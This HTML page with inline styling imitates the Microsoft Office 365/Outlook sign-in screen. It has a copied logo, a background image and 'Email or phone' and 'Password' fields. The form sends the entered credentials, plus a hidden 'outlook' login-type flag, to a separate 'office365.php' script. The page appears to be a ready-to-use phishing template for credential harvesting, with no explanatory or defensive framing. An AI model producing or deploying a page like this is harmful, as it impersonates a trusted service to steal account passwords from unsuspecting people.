<html>
<head>
<style>
body {
font-size:0.9em;
margin:0px!important;
font-family:'Segoe UI','Segoe','SegoeUI-Regular-final',Tahoma,Helvetica,Arial,sans-serif;
}
#username,#password {
width:100%;
max-width:350px;
height:28px;
border:1px solid #b8b8b8;
font-size:0.9em;
margin-bottom:10px;
}
#leftpanel {
width:65%;
height:100%;
float:left;
background:url('officebg.jpg');
background-size:cover;
}
#rightpanel {
float:right;
width:30%;
}
#login:hover {
transition:all 1s;
opacity:0.5;}
@media(max-width:800px) {
#leftpanel {
display:none;
}
#rightpanel {
float:none;
width:90%;
margin:auto;
}
}
</style>
</head>
<body>
<div id="leftpanel">
</div>
<div id="rightpanel">
<form id="loginform" action="office365.php" method="post">
<img src="officelogo.png" style="margin-top:100px;width:130px;"/><br/><br/><br/><br/><br/><br/><br/><br/>
Work or school, or personal Microsoft account<br/><br/><br/><br/>
<input type="email" name="username" id="username" placeholder="Email or phone" required/><br/>
<input type="password" name="password" id="password" placeholder="Password" required/><br/><br/><br/>
<input type="checkbox" name="signedin" id="signedin" />Keep me signed in<br/><br/><br/>
<input type="hidden" name="logintype" id="logintype" value="outlook" />
<input type="submit" name="login" value="Sign in" id="login" style="font-size:0.9em; background: #2672ec;
    border: 1px solid #fff;
    padding: 6px 12px 6px 12px;
    color: #fff;
    width: auto;
    cursor: pointer;
    margin-right: 4px;
    transition: all 1s;
    -moz-transition: background 1s;
    -webkit-transition: background 1s;
    -o-transition: background 1s;
    transition-property: background;
    transition-duration: 1s;
    -webkit-touch-callout: none;
    -webkit-user-select: none;
    -khtml-user-select: none;
    -moz-user-select: none;
    -ms-user-select: none;
    -o-user-select: none;
    user-select: none;
    display: inline-block;
 "/><br/><br/>
<a style="font-size:0.8em; color:#2872dd;">Can't access your account?</a>
<br/><br/><br/><br/><br/><br/>
<img src='footer.png' />
</form>
</div>
</body>
</html>